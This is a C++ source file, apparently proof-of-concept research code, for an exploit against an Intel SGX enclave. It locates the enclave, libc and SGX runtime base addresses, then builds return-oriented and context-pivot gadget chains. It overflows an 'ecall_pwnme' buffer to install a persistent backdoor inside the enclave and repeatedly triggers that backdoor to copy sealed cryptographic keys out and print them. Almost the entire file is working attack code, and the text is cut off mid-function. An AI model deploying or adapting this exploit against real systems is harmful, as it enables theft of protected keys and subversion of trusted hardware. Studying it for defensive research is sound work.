#include "sgx_urts.h"
#include "enclave_u.h"

#include "app/ExploitConstantAut.h"
#include "app/App.h"

#include <fcntl.h>

#include "defs.h"

#include <fstream>
#include <iostream>
#include <unistd.h>
#include <pwd.h>

using namespace std;

typedef struct ms_ecall_pwnme_t {
	const char* ms_str;
	size_t ms_l;
} ms_ecall_pwnme_t;

// extern "C" size_t sgx_gettcs(const sgx_enclave_id_t enclave_id, void** tcsList, size_t maxTcs);
void add(void*, unsigned long int, size_t*);

unsigned long baseAddr, contexec, glueGadget, bLibc, bLibSgxU;

unsigned long fakeFrame;
unsigned long workspaceBc, workspacePc, workspaceData;
unsigned long backupFF;
unsigned long backupFsBc, backupCtxBc, backupFsPc, backupCtxPc;
unsigned long backupFsBc1, backupCtxBc1, backupFsPc1, backupCtxPc1;
// unsigned long backupFsBc2, backupCtxBc2, backupFsPc2, backupCtxPc2;
unsigned long backupOc;

unsigned char buff[SEALED_KEY_LENGTH] = {0};
unsigned long Oc[70] = {0};
unsigned long workspaceOc[70] = {0};
void setOc(unsigned long);
char fileIn[12] = "fileIn.txt\0";
char fileOut[13] = "fileOut.txt";

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

unsigned long getEnclaveBaseAddress(void);
unsigned long getLibSgxUBaseAddress(void);
unsigned long getLibcBaseAddress(void);
void getStackInfo(void*,unsigned long*, unsigned long*);
size_t getTcs(void**, size_t);

void custom_ecall(uint64_t tcs, uint64_t apx, uint64_t sf, uint64_t ms);
void custom_oret(uint64_t tcs, uint64_t apx);
void initiateChain(sgx_exception_info_t*,unsigned long*,size_t);
void initiateChainEnclave(sgx_exception_info_t*,unsigned long*,unsigned long,unsigned long, size_t);
void printBuff(void);

#define LEN_FAKESTACK_IC 42
#define LEN_FAKESTACK_BC 3
#define LEN_FAKESTACK_PC 65
#define LEN_CONTEXTES_PC 14
#define LEN_FAKESTACK_BC1 3
#define LEN_CONTEXTES_PC1 6
#define LEN_FAKESTACK_PC1 18
#define R_SIZE (0x40)
#define XBUFFER_SIZE (0x600) // 0x400
#define OCALLCTX_SIZE (0x100)
#define TCS_ID 2

#define INIT_REGISTERS(mSp,mBp,mIp) __asm__ ( "mov %%rsp, %0\nmov %%rbp, %1\nlea (%%rip), %%rax\nmov %%rax, %2\n" : "=r"(mSp), "=r"(mBp), "=r"(mIp) : );

int main(int argc, char** argv) {

	sgx_launch_token_t token = {0};
  sgx_status_t ret = SGX_ERROR_UNEXPECTED;
  int updated;

	cout << "Enclave file: " << ENCLAVE_FILENAME << endl;
  ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL);
  if (ret != SGX_SUCCESS) {
    cout << "Error enclave creation\nEnter a character before exit ..." << endl;
		cout << "Errocode: " << hex << ret << endl;
    getchar();
    return -1;
  }

	// FIRST PHASE: ANALYSIS OF THE ENCLAVE:
  baseAddr = getEnclaveBaseAddress();
  contexec = CONTINUE_EXECUTION + baseAddr;
  glueGadget = GLUE_GADGET + baseAddr;
  unsigned long movRspRbp = MOV_RSPRBP + baseAddr;

  printf("Enclave base address 0x%lx\n", baseAddr);

	unsigned long mSp, mBp, mIp;

  // void* tcss2[20];
  // size_t x2 = sgx_gettcs(global_eid, tcss2, 10);
	//
  // printf("x = %ld\n", x2);
	//
  // for (int i = 0; i < x2; i++)
  //   if (i%2 == 0)
  //     printf("tcs[%d] = %p - ", i, tcss2[i]);
  //   else
  //     printf("CThread[%d] = %p\n", i, tcss2[i]);

  void* tcss[10];

  size_t x = getTcs(tcss, sizeof(tcss)/sizeof(void*));
  for (int i = 0; i < x; i++)
    printf("tcs[%d] = %p\n", i, tcss[i]);

  unsigned long sStack, lStack;
  getStackInfo(tcss[TCS_ID], &sStack, &lStack);
  //
  // unsigned long sStack1, lStack1;
  // getStackInfo(tcss[1], &sStack1, &lStack1);

  printf("\n");
  printf("Info for TCS: 0x%lx\n", (unsigned long)tcss[TCS_ID]);
  printf("Stack starts at address 0x%lx\n", sStack);
  printf("Stack's size is 0x%lx\n", lStack);
  printf("\n");
  // printf("Info for TCS: 0x%lx\n", (unsigned long)tcss[1]);
  // printf("Stack starts at address 0x%lx\n", sStack1);
  // printf("Stack's size is 0x%lx\n", lStack1);
  // printf("\n");

  bLibSgxU = getLibSgxUBaseAddress();
  printf("libsgx_urts.so base address 0x%lx\n", bLibSgxU);

  bLibc = getLibcBaseAddress();
  printf("libc.so base address 0x%lx\n", bLibc);

  printf("----------------------------------\n");

	setOc((unsigned long)tcss[TCS_ID]);

	__attribute__((aligned(64))) uint64_t stuff[(R_SIZE + XBUFFER_SIZE + OCALLCTX_SIZE)/sizeof(uint64_t)];
	ocall_context_t *myContext = (ocall_context_t*)stuff;
	void *xsave_buffer = (void*)(stuff + OCALLCTX_SIZE/sizeof(uint64_t));
	uint64_t *r = stuff + (OCALLCTX_SIZE + XBUFFER_SIZE)/sizeof(uint64_t);
	*r = 0xdeadb00f;
	*(r+1) = (uint64_t)movRspRbp;

	// INSTALLATION CHAIN!! (Ic)
	unsigned long buffFakeStackIc[LEN_FAKESTACK_IC * 3] = {0};
  unsigned long *fakeStackIc = &buffFakeStackIc[LEN_FAKESTACK_IC];
	// unsigned long padding1[0x1000] = {0}; // it must stay here!
	sgx_exception_info_t ctxIc[(LEN_FAKESTACK_IC/3) + 1] = {0};

	// PAYLOAD CHAIN!! (Pc)
	unsigned long fakeStackPc[LEN_FAKESTACK_PC] = {0};
	sgx_exception_info_t ctxPc[LEN_CONTEXTES_PC] = {0};

	// BOOT CHAIN!! (Bc)
	unsigned long fakeStackBc[LEN_FAKESTACK_BC] = {0};
	sgx_exception_info_t ctxBc[(LEN_FAKESTACK_BC/3)] = {0};

	// PAYLOAD CHAIN!! (Pc1)
	unsigned long fakeStackPc1[LEN_FAKESTACK_PC1] = {0};
	sgx_exception_info_t ctxPc1[LEN_CONTEXTES_PC1] = {0};

	// BOOT CHAIN!! (Bc1)
	unsigned long fakeStackBc1[LEN_FAKESTACK_BC1] = {0};
	sgx_exception_info_t ctxBc1[(LEN_FAKESTACK_BC1/3)] = {0};

	// POINTERS
	// my frame should start from here
	// fakeFrame = sStack - FAKE_FRAME_DISTANCE;
	fakeFrame = sStack - FAKE_FRAME_DISTANCE;
	// worspaces
	workspacePc = sStack - WORKSPACE_DISTANCE;
	workspaceData = workspacePc + 0x1000;
	// workspaceDataOld = workspaceData + 0x300;

	workspaceBc = sStack - WORKSPACE_DISTANCE - 0x500;
	// backup pointers:
	backupFF = sStack - BACKUP_DISTANCE;
	backupFsBc = backupFF + 0x1000;
	backupCtxBc = backupFF + 0x1100;
	backupFsPc = backupFF + 0x1300;
	backupCtxPc = backupFF + 0x1600;

	backupFsBc1 = backupFF + 0x2500;
	backupCtxBc1 = backupFF + 0x2600;
	backupFsPc1 = backupFF + 0x2800;
	backupCtxPc1 =  backupFF + 0x3000;

	backupOc = backupFF + 0x6000;

	r[0] = workspaceBc - 0x8;

	// set structures for fakeframe
	myContext->ocall_depth = 1;
	// myContext->ocall_ret = (uintptr_t)(fakeFrame + ((uint64_t)xsave_buffer - (uint64_t)myContext));
	myContext->ocall_ret = (uintptr_t)(fakeFrame + OCALLCTX_SIZE);
	// myContext->xbp = (uintptr_t)(fakeFrame + ((uint64_t)r - (uint64_t)myContext));
	myContext->xbp = (uintptr_t)(fakeFrame + XBUFFER_SIZE + OCALLCTX_SIZE);
	myContext->ocall_index = 0;
	myContext->ocall_flag = OCALL_FLAG;
	myContext->pre_last_sp = sStack-0x200; // test for previous stack

	// PAYLOAD CHAIN

	// pivot to if-chain
	// rdi = &old-AES + 0x68
	ctxPc[0].cpu_context.rdi = workspaceData-0x68;
	// rax = &P_KEY
	ctxPc[0].cpu_context.rax = FIRST_MALLOC + baseAddr;
	// rdx = offset
	ctxPc[0].cpu_context.rdx = sizeof(unsigned long) * 3; // offset;
	// rcx = &true-chain
	ctxPc[0].cpu_context.rcx = workspacePc + 9 * sizeof(unsigned long);
	ctxPc[0].cpu_context.rip = G1 + baseAddr;
	ctxPc[0].cpu_context.rsp = workspacePc + 3 * sizeof(unsigned long);

	// context for true: 1) memcpy(buff, p_key); 2) this pivots to ctxPc[9]
	ctxPc[1].cpu_context.rdi = (unsigned long)buff;
	ctxPc[1].cpu_context.rsi = FIRST_MALLOC + baseAddr;
	ctxPc[1].cpu_context.rdx = SEALED_KEY_LENGTH;
	ctxPc[1].cpu_context.rsp = workspacePc + 31 * sizeof(unsigned long);
	ctxPc[1].cpu_context.rip = MEMCPY + baseAddr;

	// data = p_key
	ctxPc[2].cpu_context.rdi = workspaceData;
	ctxPc[2].cpu_context.rsi = FIRST_MALLOC + baseAddr;
	ctxPc[2].cpu_context.rdx = SEALED_KEY_LENGTH;
	ctxPc[2].cpu_context.rsp = workspacePc + 34 * sizeof(unsigned long);
	ctxPc[2].cpu_context.rip = MEMCPY + baseAddr;

	// memcpy(FsBc, workspaceBc1)
  ctxPc[3].cpu_context.rdi = workspaceBc;
  ctxPc[3].cpu_context.rdx = sizeof(fakeStackBc1);
  ctxPc[3].cpu_context.rsi = backupFsBc1;
	ctxPc[3].cpu_context.rsp = workspacePc + 37 * sizeof(unsigned long);
  ctxPc[3].cpu_context.rip = MEMCPY + baseAddr;

	// memcpy(fakeframe, enclave)
  ctxPc[4].cpu_context.rdi = fakeFrame;
	ctxPc[4].cpu_context.rdx = sizeof(stuff);
  ctxPc[4].cpu_context.rsi = backupFF;
	ctxPc[4].cpu_context.rsp = workspacePc + 40 * sizeof(unsigned long);
  ctxPc[4].cpu_context.rip = MEMCPY + baseAddr;

  // save_xregs(xsave_buffer)
  ctxPc[5].cpu_context.rdi = fakeFrame + OCALLCTX_SIZE;
	ctxPc[5].cpu_context.rsp = workspacePc + 43 * sizeof(unsigned long);
  ctxPc[5].cpu_context.rip = SAVE_XREGS + baseAddr;

  // update_ocall_lastsp(fakeFrame)
  ctxPc[6].cpu_context.rdi = fakeFrame;
	ctxPc[6].cpu_context.rsp = workspacePc + 46 * sizeof(unsigned long);
  ctxPc[6].cpu_context.rip = UPDATE_OCALL_LASTSP + baseAddr;

	// memcpy(bkpOc, workspaceOc)
	ctxPc[7].cpu_context.rdi = (uint64_t) workspaceOc;
  ctxPc[7].cpu_context.rdx = sizeof(Oc);
  ctxPc[7].cpu_context.rsi = backupOc;
	ctxPc[7].cpu_context.rsp = workspacePc + 49 * sizeof(unsigned long);
  ctxPc[7].cpu_context.rip = MEMCPY + baseAddr;

	// pivot to the Oc
	ctxPc[8].cpu_context.rax = EEXIT;
  ctxPc[8].cpu_context.rsp = (uint64_t) workspaceOc + 0x8;
  ctxPc[8].cpu_context.rbx = (uint64_t) Oc[0];
  ctxPc[8].cpu_context.rip = ENCLU_TRTS + baseAddr;

	// false chain

  // memcpy(FsBc, workspaceBc)
  ctxPc[9].cpu_context.rdi = workspaceBc;
  ctxPc[9].cpu_context.rdx = sizeof(fakeStackBc);
  ctxPc[9].cpu_context.rsi = backupFsBc;
	ctxPc[9].cpu_context.rsp = workspacePc + 52 * sizeof(unsigned long);
  ctxPc[9].cpu_context.rip = MEMCPY + baseAddr;

	// memcpy(fakeframe, enclave)
  ctxPc[10].cpu_context.rdi = fakeFrame;
	ctxPc[10].cpu_context.rdx = sizeof(stuff);
  ctxPc[10].cpu_context.rsi = backupFF;
	ctxPc[10].cpu_context.rsp = workspacePc + 55 * sizeof(unsigned long);
  ctxPc[10].cpu_context.rip = MEMCPY + baseAddr;

  // save_xregs(xsave_buffer)
  ctxPc[11].cpu_context.rdi = fakeFrame + OCALLCTX_SIZE;
	ctxPc[11].cpu_context.rsp = workspacePc + 58 * sizeof(unsigned long);
  ctxPc[11].cpu_context.rip = SAVE_XREGS + baseAddr;

  // update_ocall_lastsp(fakeFrame)
  ctxPc[12].cpu_context.rdi = fakeFrame;
	ctxPc[12].cpu_context.rsp = workspacePc + 61 * sizeof(unsigned long);
  ctxPc[12].cpu_context.rip = UPDATE_OCALL_LASTSP + baseAddr;

	// it is supposed to leave the enclave carefully
	INIT_REGISTERS(mSp, mBp, mIp)
	ctxPc[13].cpu_context.rax = EEXIT;
  ctxPc[13].cpu_context.rsp = mSp - 0x18; // I predict next frame
  ctxPc[13].cpu_context.rbp = mSp - 0x10; // I predict next frame
  // NOTE: this is an HARDCODE offest, to recompute at any compilation!!
  ctxPc[13].cpu_context.rbx = mIp + RIP_DELTA_PC;
  ctxPc[13].cpu_context.rip = ENCLU_TRTS + baseAddr;


	// if-chain
	fakeStackPc[0] = glueGadget;
	fakeStackPc[1] = backupCtxPc; // ctxPc[0]
	fakeStackPc[2] = contexec;

	// add if-chain here
	// fakeStackPc[3] = G1 + baseAddr; // mov eax, dword ptr [rax]
	fakeStackPc[3] = G2 + baseAddr; // mov rdi, qword ptr [rdi + 0x68]
	fakeStackPc[4] = G3 + baseAddr; // [old] cmp rax, rdi ; sete al ; movzx eax, al
																	// cmp eax, edi ; sete al ; movzx eax, al ; ret
	fakeStackPc[5] = G4 + baseAddr; // neg eax
	fakeStackPc[6] = G5 + baseAddr; // and eax, edx
	fakeStackPc[7] = G6 + baseAddr; // add rax, rcx
	fakeStackPc[8] = G7 + baseAddr; // xchg rax, rsp

	fakeStackPc[9] = glueGadget;
	fakeStackPc[10] = 0x2;
	fakeStackPc[11] = 0x3;
	fakeStackPc[12] = glueGadget;
	fakeStackPc[13] = 0x5;
	fakeStackPc[14] = 0x6;
	fakeStackPc[15] = 0x7;
	fakeStackPc[16] = 0x8;
	fakeStackPc[17] = 0x9;
	fakeStackPc[18] = 0xa;
	fakeStackPc[19] = 0xb;
	fakeStackPc[20] = 0xc;
	fakeStackPc[21] = 0xd;
	fakeStackPc[22] = 0xe;
	fakeStackPc[23] = 0xf;
	fakeStackPc[24] = 0x10;
	fakeStackPc[25] = 0x11;
	// frame false => p_key changed! => memcpy(buff, p_key)
	fakeStackPc[26] = backupCtxPc + 1 * sizeof(sgx_exception_info_t);
	fakeStackPc[27] = contexec;
	// frame true => p_key didn't change
	fakeStackPc[28] = glueGadget;
	fakeStackPc[29] = backupCtxPc + 9 * sizeof(sgx_exception_info_t);
	fakeStackPc[30] = contexec;
	//
	fakeStackPc[31] = glueGadget;
	fakeStackPc[32] = backupCtxPc + 2 * sizeof(sgx_exception_info_t);
	fakeStackPc[33] = contexec;

	fakeStackPc[34] = glueGadget;
	fakeStackPc[35] = backupCtxPc + 3 * sizeof(sgx_exception_info_t);;
	fakeStackPc[36] = contexec;

	fakeStackPc[37] = glueGadget;
	fakeStackPc[38] = backupCtxPc + 4 * sizeof(sgx_exception_info_t);
	fakeStackPc[39] = contexec;

	fakeStackPc[40] = glueGadget;
	fakeStackPc[41] = backupCtxPc + 5 * sizeof(sgx_exception_info_t);
	fakeStackPc[42] = contexec;

	fakeStackPc[43] = glueGadget;
	fakeStackPc[44] = backupCtxPc + 6 * sizeof(sgx_exception_info_t);
	fakeStackPc[45] = contexec;

	fakeStackPc[46] = glueGadget;
	fakeStackPc[47] = backupCtxPc + 7 * sizeof(sgx_exception_info_t);
	fakeStackPc[48] = contexec;

	fakeStackPc[49] = glueGadget;
	fakeStackPc[50] = backupCtxPc + 8 * sizeof(sgx_exception_info_t);
	fakeStackPc[51] = contexec;

	fakeStackPc[52] = glueGadget;
	fakeStackPc[53] = backupCtxPc + 10 * sizeof(sgx_exception_info_t);
	fakeStackPc[54] = contexec;

	fakeStackPc[55] = glueGadget;
	fakeStackPc[56] = backupCtxPc + 11 * sizeof(sgx_exception_info_t);
	fakeStackPc[57] = contexec;

	fakeStackPc[58] = glueGadget;
	fakeStackPc[59] = backupCtxPc + 12 * sizeof(sgx_exception_info_t);
	fakeStackPc[60] = contexec;

	fakeStackPc[61] = glueGadget;
	fakeStackPc[62] = backupCtxPc + 13 * sizeof(sgx_exception_info_t);
	fakeStackPc[63] = contexec;

	// memcpy(Pc, workspace1)
	ctxBc[0].cpu_context.rdi = workspacePc;
	ctxBc[0].cpu_context.rdx = sizeof(fakeStackPc);
	ctxBc[0].cpu_context.rsi = backupFsPc;
	ctxBc[0].cpu_context.rip = MEMCPY + baseAddr;
	ctxBc[0].cpu_context.rsp = workspacePc;

	fakeStackBc[0] = glueGadget;
	fakeStackBc[1] = backupCtxBc;
	fakeStackBc[2] = contexec;

	// PAYLOAD CHAIN 1

	// meset(0, workspaceOc)
  ctxPc1[0].cpu_context.rdi = (uint64_t) workspaceOc;
  ctxPc1[0].cpu_context.rdx = sizeof(Oc);
  ctxPc1[0].cpu_context.rsi = 0x0;
	ctxPc1[0].cpu_context.rsp = workspacePc + 3 * sizeof(unsigned long);
	ctxPc1[0].cpu_context.rip = MEMSET + baseAddr;

	// memcpy(FsBc, workspaceBc)
  ctxPc1[1].cpu_context.rdi = workspaceBc;
  ctxPc1[1].cpu_context.rdx = sizeof(fakeStackBc);
  ctxPc1[1].cpu_context.rsi = backupFsBc;
	ctxPc1[1].cpu_context.rsp = workspacePc + 6 * sizeof(unsigned long);
	ctxPc1[1].cpu_context.rip = MEMCPY + baseAddr;

	// memcpy(fakeframe, enclave)
  ctxPc1[2].cpu_context.rdi = fakeFrame;
	ctxPc1[2].cpu_context.rdx = sizeof(stuff);
  ctxPc1[2].cpu_context.rsi = backupFF;
	ctxPc1[2].cpu_context.rsp = workspacePc + 9 * sizeof(unsigned long);
  ctxPc1[2].cpu_context.rip = MEMCPY + baseAddr;

  // save_xregs(xsave_buffer)
  ctxPc1[3].cpu_context.rdi = fakeFrame + OCALLCTX_SIZE;
	ctxPc1[3].cpu_context.rsp = workspacePc + 12 * sizeof(unsigned long);
  ctxPc1[3].cpu_context.rip = SAVE_XREGS + baseAddr;

  // update_ocall_lastsp(fakeFrame)
  ctxPc1[4].cpu_context.rdi = fakeFrame;
	ctxPc1[4].cpu_context.rsp = workspacePc + 15 * sizeof(unsigned long);
  ctxPc1[4].cpu_context.rip = UPDATE_OCALL_LASTSP + baseAddr;

	// INIT_REGISTERS(mSp,mBp,mIp)
	ctxPc1[5].cpu_context.rax = EEXIT;
  ctxPc1[5].cpu_context.rsp = mSp - 0x18; // I predict next frame
  ctxPc1[5].cpu_context.rbp = mSp - 0x10; // I predict next frame
  // NOTE: this is an HARDCODE offest, to recompute at any compilation!!
  ctxPc1[5].cpu_context.rbx = mIp + RIP_DELTA_PC;
  ctxPc1[5].cpu_context.rip = ENCLU_TRTS + baseAddr;

	fakeStackPc1[0] = glueGadget;
	fakeStackPc1[1] = backupCtxPc1; // ctxPc1[0]
	fakeStackPc1[2] = contexec;
	fakeStackPc1[3] = glueGadget;
	fakeStackPc1[4] = backupCtxPc1 + 1 * sizeof(sgx_exception_info_t);
	fakeStackPc1[5] = contexec;
	fakeStackPc1[6] = glueGadget;
	fakeStackPc1[7] = backupCtxPc1 + 2 * sizeof(sgx_exception_info_t);
	fakeStackPc1[8] = contexec;
	fakeStackPc1[9] = glueGadget;
	fakeStackPc1[10] = backupCtxPc1 + 3 * sizeof(sgx_exception_info_t);
	fakeStackPc1[11] = contexec;
	fakeStackPc1[12] = glueGadget;
	fakeStackPc1[13] = backupCtxPc1 + 4 * sizeof(sgx_exception_info_t);
	fakeStackPc1[14] = contexec;
	fakeStackPc1[15] = glueGadget;
	fakeStackPc1[16] = backupCtxPc1 + 5 * sizeof(sgx_exception_info_t);
	fakeStackPc1[17] = contexec;

	// memcpy(Pc1, workspace1)
	ctxBc1[0].cpu_context.rdi = workspacePc;
	ctxBc1[0].cpu_context.rdx = sizeof(fakeStackPc1);
	ctxBc1[0].cpu_context.rsi = backupFsPc1;
	ctxBc1[0].cpu_context.rip = MEMCPY + baseAddr;
	ctxBc1[0].cpu_context.rsp = workspacePc;

	fakeStackBc1[0] = glueGadget;
	fakeStackBc1[1] = backupCtxBc1;
	fakeStackBc1[2] = contexec;

	// initiateChainEnclave(ctxPc1, fakeStackPc1, backupCtxPc1, workspacePc, LEN_FAKESTACK_PC1);

	// INSTALLATION CHAIN

  // memcpy(fakeframe, backup)
  ctxIc[0].cpu_context.rdi = backupFF;
  ctxIc[0].cpu_context.rdx = sizeof(stuff);
  ctxIc[0].cpu_context.rsi = (unsigned long)stuff;
  ctxIc[0].cpu_context.rsp = (unsigned long)fakeStackIc;
  ctxIc[0].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(CtxBc, backupCtxBc)
  ctxIc[1].cpu_context.rdi = backupCtxBc;
  ctxIc[1].cpu_context.rdx = sizeof(ctxBc);
  ctxIc[1].cpu_context.rsi = (unsigned long)ctxBc;
  ctxIc[1].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(FsBc, backupFsBc)
  ctxIc[2].cpu_context.rdi = backupFsBc;
  ctxIc[2].cpu_context.rdx = sizeof(fakeStackBc);
  ctxIc[2].cpu_context.rsi = (unsigned long)fakeStackBc;
  ctxIc[2].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(CtxPc, backupCtxPc)
  ctxIc[3].cpu_context.rdi = backupCtxPc;
  ctxIc[3].cpu_context.rdx = sizeof(ctxPc);
  ctxIc[3].cpu_context.rsi = (unsigned long)ctxPc;
  ctxIc[3].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(FsPc, backupFsPc)
  ctxIc[4].cpu_context.rdi = backupFsPc;
  ctxIc[4].cpu_context.rdx = sizeof(fakeStackPc);
  ctxIc[4].cpu_context.rsi = (unsigned long)fakeStackPc;
  ctxIc[4].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(CtxBc1, backupCtxBc1)
  ctxIc[5].cpu_context.rdi = backupCtxBc1;
  ctxIc[5].cpu_context.rdx = sizeof(ctxBc1);
  ctxIc[5].cpu_context.rsi = (unsigned long)ctxBc1;
  ctxIc[5].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(FsBc1, backupFsBc1)
  ctxIc[6].cpu_context.rdi = backupFsBc1;
  ctxIc[6].cpu_context.rdx = sizeof(fakeStackBc1);
  ctxIc[6].cpu_context.rsi = (unsigned long)fakeStackBc1;
  ctxIc[6].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(CtxPc1, backupCtxPc1)
  ctxIc[7].cpu_context.rdi = backupCtxPc1;
  ctxIc[7].cpu_context.rdx = sizeof(ctxPc1);
  ctxIc[7].cpu_context.rsi = (unsigned long)ctxPc1;
  ctxIc[7].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(FsPc1, backupFsPc1)
  ctxIc[8].cpu_context.rdi = backupFsPc1;
  ctxIc[8].cpu_context.rdx = sizeof(fakeStackPc1);
  ctxIc[8].cpu_context.rsi = (unsigned long)fakeStackPc1;
  ctxIc[8].cpu_context.rip = MEMCPY + baseAddr;

	// memcpy(Oc, backupOc)
  ctxIc[9].cpu_context.rdi = backupOc;
  ctxIc[9].cpu_context.rdx = sizeof(Oc);
  ctxIc[9].cpu_context.rsi = (unsigned long)Oc;
  ctxIc[9].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(FsBc, workspaceBc)
  ctxIc[10].cpu_context.rdi = workspaceBc;
  ctxIc[10].cpu_context.rdx = sizeof(fakeStackBc);
  ctxIc[10].cpu_context.rsi = (unsigned long)fakeStackBc;
  ctxIc[10].cpu_context.rip = MEMCPY + baseAddr;

  // memcpy(fakeframe, enclave)
  ctxIc[11].cpu_context.rdi = fakeFrame;
  ctxIc[11].cpu_context.rdx = sizeof(stuff);
  ctxIc[11].cpu_context.rsi = (unsigned long)stuff;
  ctxIc[11].cpu_context.rip = MEMCPY + baseAddr;

  // save_xregs(xsave_buffer)
  ctxIc[12].cpu_context.rdi = fakeFrame + OCALLCTX_SIZE;
  ctxIc[12].cpu_context.rip = SAVE_XREGS + baseAddr;

  // update_ocall_lastsp(fakeFrame)
  ctxIc[13].cpu_context.rdi = fakeFrame;
  ctxIc[13].cpu_context.rip = UPDATE_OCALL_LASTSP + baseAddr;

  INIT_REGISTERS(mSp, mBp, mIp)
  ctxIc[14].cpu_context.rax = EEXIT;
  ctxIc[14].cpu_context.rsp = mSp;
  ctxIc[14].cpu_context.rbp = mBp;
  // NOTE: this is an HARDCODE offest, to recompute at any compilation!!
  ctxIc[14].cpu_context.rbx = mIp + RIP_DELTA_IC;
  ctxIc[14].cpu_context.rip = ENCLU_TRTS + baseAddr;

  initiateChain(ctxIc, fakeStackIc, LEN_FAKESTACK_IC);

  uint64_t apx = bLibSgxU + UMORESTACK + 0x105;
  // uint64_t apx = bLibSgxU + ENCLU_URTS;

	// EXPLOIT CHAIN!!
  uint8_t exploit[500] = {0};
  size_t len = 0;
	// padding
  for (len = 0; len < 0x78; len++)
    exploit[len] = 'A';
  // add(&exploit[len], 0xdead00fdeadb00f, &len);
  // 0x0000000000000f40 : pop rdi ; ret
  add(&exploit[len], POP_RDI + baseAddr, &len);
  // &ctx0
  add(&exploit[len], (unsigned long)&ctxIc[0], &len);
  // &continue_execution
  add(&exploit[len], contexec, &len);

	int resp_enclave;
	uint8_t* sealed_key_b_0 = new uint8_t[SEALED_KEY_LENGTH];
	uint8_t* sealed_key_b_1 = new uint8_t[SEALED_KEY_LENGTH];

	ret = generateKeyEnclave(global_eid, &resp_enclave, sealed_key_b_0, SEALED_KEY_LENGTH);
	if (ret != SGX_SUCCESS)
			return ret;

	cout << "Generated Key_0" << endl;

	ret = generateKeyEnclave(global_eid, &resp_enclave, sealed_key_b_1, SEALED_KEY_LENGTH);
	if (ret != SGX_SUCCESS)
			return ret;

	cout << "Generated Key_1" << endl;

	ret = loadKeyEnclave(global_eid, &resp_enclave, sealed_key_b_0, SEALED_KEY_LENGTH);
	if (ret != SGX_SUCCESS)
			return ret;

	cout << "Loaded Key_0" << endl;

	// INSTALLATION PHASE!
	ms_ecall_pwnme_t ms;
  ms.ms_str = (const char*)exploit;
  ms.ms_l = len;
  custom_ecall((uint64_t)tcss[TCS_ID], apx, 0, (uint64_t)&ms);

	cout << "Infectione done!" << endl;

	ret = loadKeyEnclave(global_eid, &resp_enclave, sealed_key_b_0, SEALED_KEY_LENGTH);
	if (ret != SGX_SUCCESS)
			return ret;

	cout << "Loaded Key_0" << endl;

	// TRIGGER BACKDOOR
	custom_oret((uint64_t)tcss[TCS_ID], apx);

	cout << "Exfiltrate Key:";
	printBuff();

	ret = loadKeyEnclave(global_eid, &resp_enclave, sealed_key_b_0, SEALED_KEY_LENGTH);
	if (ret != SGX_SUCCESS)
			return ret;

	cout << "Loaded Key_0" << endl;

	// TRIGGER BACKDOOR
	custom_oret((uint64_t)tcss[TCS_ID], apx);

	cout << "Exfiltrate Key:";
	printBuff();

	ret = loadKeyEnclave(global_eid, &resp_enclave, sealed_key_b_1, SEALED_KEY_LENGTH);
	if (ret != SGX_SUCCESS)
			return ret;

	cout << "Loaded Key_1" << endl;

	// TRIGGER BACKDOOR
	custom_oret((uint64_t)tcss[TCS_ID], apx);

	cout << "Exfiltrate Key:";
	printBuff();

	delete[] sealed_key_b_0;
	delete[] sealed_key_b_1;

	sgx_destroy_enclave(global_eid);
	cout << "Enclave destroyed" << endl;

	return 0;
}

void custom_ecall(uint64_t tcs, uint64_t apx, uint64_t sf, uint64_t ms) {
  uint64_t eenter = EENTER;

  __asm__ (
    "mov %0, %%rax\n"
    "mov %1, %%rbx\n"
    "mov %2, %%rdi\n"
    "mov %3, %%rcx\n"
    "mov %4, %%rsi\n"
    "enclu\n"
    : // no output
    : "r"(eenter), "r"(tcs), "r"(sf) , "r"(apx), "r"(ms)
    : "rax", "rbx", "rdi", "rcx", "rsi"
  );
}

void custom_oret(uint64_t tcs, uint64_t apx) {

    uint64_t eenter = EENTER;
    uint64_t oret = -2;

    __asm__ (
      "mov %0, %%rax\n"
      "mov %1, %%rbx\n"
      "mov %2, %%rdi\n"
      "mov %3, %%rcx\n"
      "enclu\n"
      : // no output
      : "r"(eenter), "r"(tcs), "r"(oret) , "r"(apx)
      : "rax", "rbx", "rdi", "rcx"
    );

}

unsigned long getEnclaveBaseAddress() {
  FILE * fp;
  char * line = NULL;
  size_t len = 100;
  ssize_t read;

  line = (char*)malloc(len);

  pid_t p = getpid();

  char fPath[100] = { 0 };
  //printf("PID = %d\n", p);

  snprintf(fPath, 100, "/proc/%d/maps", p);

  //printf("map file: %s\n", fPath);

  fp = fopen(fPath, "r");
  if (fp == NULL) {
      printf("fail opening: %s\n", fPath);
      free(line);
      exit(EXIT_FAILURE);
  }

  bool atLeastOne = false;
  while ((read = getline(&line, &len, fp)) != -1) {
    if(strstr(line, "isgx") != NULL) {
      atLeastOne = true;
      break;
    }
  }

  fclose(fp);

  if (atLeastOne) {
    // I extract basic address
    printf("There is at least an enclave\n");
    //printf("isgx: %s\n", line);

    char* pEnd = strstr(line, "-");

    char strBaseAddr[17] = { 0 };

    memcpy(strBaseAddr, line, pEnd-line);
    strBaseAddr[17] = {0};

    //printf("Estimaqted base addr: 0x%s\n", strBaseAddr);

    unsigned long baseAddr = (unsigned long)strtol(strBaseAddr, NULL, 16);

    free(line);

    return baseAddr;
  }
  else {
    printf("I didn't find any enclave!\n");
    free(line);
    exit(EXIT_FAILURE);
  }

  free(line);
  exit(EXIT_SUCCESS);
}

size_t getTcs(void** tcs, size_t l) {
  FILE * fp;
  ssize_t read;

  size_t len = 100;
  char *line;
  line = (char*)malloc(len);
  uint64_t deltaComulative = 0;
  uint64_t prevEnd = 0;
  uint64_t prevStrt = 0;

  pid_t p = getpid();

  char fPath[100] = { 0 };
  //printf("PID = %d\n", p);

  snprintf(fPath, sizeof(fPath), "/proc/%d/maps", p);

  //printf("map file: %s\n", fPath);

  fp = fopen(fPath, "r");
  if (fp == NULL) {
      printf("fail opening: %s\n", fPath);
      free(line);
      exit(EXIT_FAILURE);
  }

  int i = 0;

